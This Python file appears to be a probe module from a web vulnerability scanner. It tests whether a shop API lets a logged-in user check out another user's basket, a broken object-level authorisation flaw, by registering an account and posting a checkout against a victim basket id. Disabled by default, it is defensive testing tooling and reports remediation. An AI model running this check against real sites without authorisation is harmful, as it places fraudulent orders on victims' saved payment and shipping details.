#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Authorization (BOLA): caller can check out an arbitrary basket id.

`POST /rest/basket/<id>/checkout` should refuse when the path id
doesn't match the caller's basket. When it doesn't, an attacker
checks out a victim's basket — placing an order on the victim's
saved card / shipping address.

Detection signal:
  Authenticated POST /rest/basket/<other_id>/checkout → 200 with an
  `orderConfirmation` token.

This is intrinsically destructive (a checkout creates an order). Off
by default; require `--allow-destroy`. The ordered items are visible
in the audit log, and the operator can refund the order out-of-band.

Tested against:
  + OWASP Juice Shop  /rest/basket/1/checkout to a non-owner returns
                      orderConfirmation → validated=True (when
                      --allow-destroy is set).
  + nginx default site → validated=False
"""
from __future__ import annotations

import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

CHECKOUT_PATH = "/rest/basket/{id}/checkout"


def _register_and_login(client: SafeClient, origin: str) -> dict:
    email = f"checkout-{secrets.token_hex(6)}@dast.test"
    pw    = "Pr0be-" + secrets.token_hex(4)
    out: dict = {"email": email, "password": pw, "token": None, "bid": None}
    body = json.dumps({"email": email, "password": pw,
                       "passwordRepeat": pw,
                       "securityQuestion": {"id": 1},
                       "securityAnswer": "probe"}).encode()
    r = client.request("POST", urljoin(origin, "/api/Users"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["register_status"] = r.status
    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request("POST", urljoin(origin, "/rest/user/login"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            auth = doc.get("authentication") or {}
            out["token"] = auth.get("token")
            out["bid"]   = auth.get("bid")
        except json.JSONDecodeError:
            pass
    return out


class BasketCheckoutArbitraryProbe(Probe):
    name = "authz_basket_checkout_arbitrary"
    summary = ("Detects checkout-arbitrary-basket BOLA: caller can "
               "complete checkout against another user's basket id.")
    safety_class = "destructive"

    def add_args(self, parser):
        parser.add_argument(
            "--victim-bid", type=int, default=1,
            help="Basket id to check out (default 1 — admin's basket).")
        parser.add_argument(
            "--allow-destroy", action="store_true",
            help="Required — checkout creates an order row.")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        if not getattr(args, "allow_destroy", False):
            return Verdict(
                validated=None, confidence=0.0,
                summary=("Skipped: this probe issues a checkout that "
                         "creates an order row. Re-run with "
                         "--allow-destroy."),
                evidence={"origin": origin, "safety_skipped": True},
            )
        sess = _register_and_login(client, origin)
        if not sess.get("token"):
            return Verdict(
                validated=False, confidence=0.6,
                summary=f"Inconclusive: no probe session on {origin}.",
                evidence={"origin": origin,
                          "session": {k: v for k, v in sess.items()
                                      if k != "password"}},
            )
        token   = sess["token"]
        own_bid = sess.get("bid")
        victim  = int(args.victim_bid)
        if own_bid is not None and own_bid == victim:
            victim = victim + 1

        url = urljoin(origin, CHECKOUT_PATH.format(id=victim))
        r = client.request("POST", url, headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
        }, body=b"{}")

        attempt = {"path": url, "status": r.status, "size": r.size,
                   "victim_bid": victim, "own_bid": own_bid,
                   "body_excerpt": (r.text or "")[:200]}
        evidence = {"origin": origin, "session_email": sess.get("email"),
                    "attempt": attempt}

        confirmed = False
        if r.status == 200 and r.body:
            try:
                doc = json.loads(r.text)
            except json.JSONDecodeError:
                doc = None
            ack = None
            if isinstance(doc, dict):
                ack = doc.get("orderConfirmation") \
                      or doc.get("orderId") \
                      or (isinstance(doc.get("data"), dict)
                          and doc["data"].get("orderConfirmation"))
            if ack:
                attempt["order_confirmation"] = ack
                confirmed = True

        if confirmed:
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: checkout against foreign basket "
                         f"{victim} on {origin} succeeded "
                         f"(orderConfirmation={attempt['order_confirmation']!r})."),
                evidence=evidence,
                severity_uplift="high",
                remediation=(
                    "Reject /rest/basket/<id>/checkout when the path id "
                    "does not match the caller's session basket. Apply "
                    "the same rule on every basket-id-bearing endpoint."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: checkout on foreign basket {victim} "
                     f"returned status {r.status} with no order "
                     "confirmation token."),
            evidence=evidence,
        )


if __name__ == "__main__":
    BasketCheckoutArbitraryProbe().main()
